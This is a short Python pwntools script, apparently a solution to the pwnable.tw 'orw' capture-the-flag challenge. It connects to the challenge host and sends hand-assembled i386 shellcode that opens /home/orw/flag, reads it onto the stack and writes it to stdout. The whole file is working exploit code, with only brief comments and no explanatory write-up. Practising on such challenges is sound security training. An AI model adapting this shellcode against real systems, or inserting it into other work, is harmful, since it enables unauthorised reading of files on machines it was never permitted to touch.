from pwn import *


r = remote('chall.pwnable.tw', port=10001)
context.arch = 'i386'
# open syscall
# just push the needed filename and fill the registers by the instruction
open_sh = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),
    'xor ecx, ecx',
    'xor edx, edx',
    'mov ebx, esp',
    'mov eax, 0x5',
    'int 0x80'
    ]))
# read from the file syscall
# buffer is esp, just to be simple as possible
read_sh = asm('\n'.join([
    'mov ebx, eax',
    'mov eax, 0x3',
    'mov edx, 0x66',
    'mov ecx, esp',
    'int 0x80']))
# write to stdout syscall
# buffer again is esp
write_sh = asm('\n'.join([
    'mov ebx, 0x1',
    'mov eax, 0x4',
    'mov ecx, esp',
    'mov edx, 0x66',
    'int 0x80']))
print(r.recv())
payload = open_sh + read_sh + write_sh
print(payload)
r.sendline(payload)
print(r.recvuntil('\n'))
